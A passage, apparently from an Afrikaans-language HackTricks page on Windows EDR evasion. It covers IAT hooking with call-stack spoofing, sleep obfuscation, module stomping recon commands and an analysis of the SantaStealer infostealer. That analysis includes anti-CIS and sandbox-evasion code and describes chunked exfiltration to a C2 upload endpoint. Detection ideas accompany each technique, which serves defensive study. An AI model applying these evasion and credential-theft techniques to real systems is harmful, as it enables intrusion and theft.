- Dek post-ex DLLs: deur LoadLibrary* te hook kan jy module loads onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API calls toepas.
- Herstel betroubare gebruik van process-spawning post-ex commands teen call-stack–gebaseerde detections deur CreateProcessA/W te wrap.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe na relocations/ASLR en voor eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking gedurende DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT value wat jy vasgelê het voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX transitions vir PIC en vermy om writable+executable pages te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou ’n valse call chain (return addresses in benigne modules) en pivot dan in die werklike API in.
- Dit verydel detections wat canonical stacks van Beacon/BOFs na sensitive APIs verwag.
- Kombineer met stack cutting/stack stitching techniques om binne verwagte frames te land voor die API prologue.

Operational integration
- Voeg die reflective loader voor post-ex DLLs in sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder code changes.

Detection/DFIR considerations
- IAT integrity: entries wat na non-image (heap/anon) addresses resolve; periodiese verification van import pointers.
- Stack anomalies: return addresses wat nie aan loaded images behoort nie; abrupte transitions na non-image PIC; inkonsekwente RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes na IAT, vroeë DllMain activity wat import thunks modify, onverwags RX regions wat by load geskep word.
- Image-load evasion: as hooking LoadLibrary*, monitor suspicious loads van automation/clr assemblies gekorreleer met memory masking events.

Related building blocks and examples
- Reflective loaders wat IAT patching during load uitvoer (bv. TitanLdr, AceLdr)
- Memory masking hooks (bv. simplehook) en stack-cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress` pointer te vervang met ’n custom resolver wat eers hooks kontroleer:

- Bou ’n **resident PICO** (persistent PIC object) wat bly voortbestaan nadat die transient loader PIC homself vrymaak.
- Export ’n `setup_hooks()` function wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, slaan ordinal imports oor en gebruik ’n hash-based hook lookup soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders delegeer na die werklike `GetProcAddress`.
- Registreer hook targets by link time met Crystal Palace `addhook "MODULE$Func" "hook"` entries. Die hook bly geldig omdat dit binne die resident PICO leef.

Dit lewer **import-time IAT redirection** sonder om die gelaaide DLL se code section post-load te patch.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks aktiveer net as die function werklik in die target se IAT is. As ’n module APIs via ’n PEB-walk + hash resolveer (geen import entry nie), forceer ’n regte import sodat die loader se `ProcessImports()` path dit sien:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte reference soos `&WaitForSingleObject`.
- Die compiler emit dan ’n IAT entry, wat interception moontlik maak wanneer die reflective loader imports resolveer.

### Ekko-style sleep/idle obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, wrap die call in ’n Ekko-style obfuscation chain wat die in-memory image during idle enkripteer:

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` roep met saamgestelde `CONTEXT` frames.
- Tipiese chain (x64): stel image na `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` oor die volle mapped image → voer die blocking wait uit → RC4 decrypt → **herstel per-section permissions** deur PE sections te loop → signaleer completion.
- `RtlCaptureContext` voorsien ’n template `CONTEXT`; kloon dit in multiple frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap uit te voer.

Operational detail: return “success” vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon versteek die module tydens idle windows vir scanners en vermy die klassieke “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts van `CreateTimerQueueTimer` callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot aaneenlopende image-sized buffers gebruik word.
- Groot-reeks `VirtualProtect` gevolg deur custom per-section permission restoration.


## Precision Module Stomping

Module stomping voer payloads uit vanaf die **`.text` section van ’n DLL wat reeds binne die target process gemap is** in plaas daarvan om duidelike private executable memory toe te ken of ’n nuwe opofferings-DLL te laai. Die overwrite target behoort ’n **gelaaide, disk-backed image** te wees waarvan die code space die payload kan absorbeer sonder om code paths wat die process nog nodig het te korrupteer.

### Reliable target selection

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL mag nie in die remote process gelaai wees nie, en ’n te klein code region sal die process laat crash. ’n Meer betroubare workflow is:

1. Enumereer die target process modules en hou ’n **names-only include list** van DLLs wat reeds gelaai is.
2. Bou die payload eerste en teken die **presiese byte size** aan.
3. Skandeer kandidaat-DLLs op disk en vergelyk die PE section **`.text` `Misc_VirtualSize`** met die payload size. Dit maak meer saak as die file size omdat dit die grootte van die executable section **wanneer dit in memory gemap is** weerspieël.
4. Parse die **Export Address Table (EAT)** en kies ’n geëxporteerde function RVA as die stomp start offset.
5. Bereken die **blast radius**: as die payload die gekose function boundary oorskry, sal dit aangrensende exports oorskryf wat daarna in memory uitgelê is.

Tipiese recon/selection helpers wat in die wild gesien word:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operationele notas
- Verkies DLLs **reeds gelaai** in die remote process om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die teiken-toepassing uitgevoer word; anders kan normale code paths die stomped bytes voor of ná thread creation tref.
- Groot implants vereis dikwels om shellcode embedding van ’n string literal na ’n **byte-array/braced initializer** te verander sodat die volle buffer korrek in die injector source voorgestel word.

Detection idees
- Remote writes in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX allocations.
- Export entry points waarvan die in-memory bytes nie meer ooreenstem met die backing file op disk nie.
- Remote threads of context pivots wat execution begin binne ’n legitieme DLL export waarvan die eerste bytes onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory` sequences teen DLL `.text` pages gevolg deur thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in ’n enkele workflow kombineer.

### Keyboard layout gating & sandbox delay

- ’n Config flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As ’n Cyrillic layout gevind word, laat die sample ’n leë `CIS` marker val en beëindig voor die stealers loop, wat verseker dat dit nooit op uitgeslote locales detoneer nie terwyl dit ’n hunting artifact agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Laaggewyse `check_antivm` logika

- Variant A loop deur die proseslys, hash elke naam met ’n aangepaste rolling checksum, en vergelyk dit met ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkende gidse soos `C:\analysis`.
- Variant B inspekteer stelsel-eienskappe (proses-telling vloer, onlangse uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor, en voer tydsberekeningstoetse rondom sleeps uit om single-stepping raak te sien. Enige treffer breek af voordat modules begin.

### Fileless helper + double ChaCha20 reflective loading

- Die primêre DLL/EXE bevat ’n Chromium credential helper wat óf na skyf gedrop word óf handmatig in-memory gemap word; fileless mode los imports/relocations self op sodat geen helper-artifakte geskryf word nie.
- Daardie helper stoor ’n tweede-fase DLL wat twee keer met ChaCha20 geïnkripteer is (twee 32-byte keys + 12-byte nonces). Ná albei passe laai dit die blob reflektief (geen `LoadLibrary`) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan wat van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) afgelei is.
- Die ChromElevator-routines gebruik direct-syscall reflective process hollowing om in ’n lewende Chromium browser in te spuit, erf AppBound Encryption sleutels, en dekripteer wagwoorde/cookies/credit cards direk uit SQLite databases ten spyte van ABE hardening.


### Modulaire in-memory collection & chunked HTTP exfil

- `create_memory_based_log` loop deur ’n globale `memory_generators` function-pointer table en skep een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, ens.). Elke thread skryf resultate in shared buffers en rapporteer sy lêertelling ná ’n ~45s join window.
- Sodra dit klaar is, word alles met die staties gelinkte `miniz` library as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15s en stroom die argief in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n browser `multipart/form-data` boundary vervals (`----WebKitFormBoundary***`). Elke chunk voeg `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>`, en die laaste chunk voeg `complete: true` by sodat die C2 weet herassemblage is klaar.

## Verwysings


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
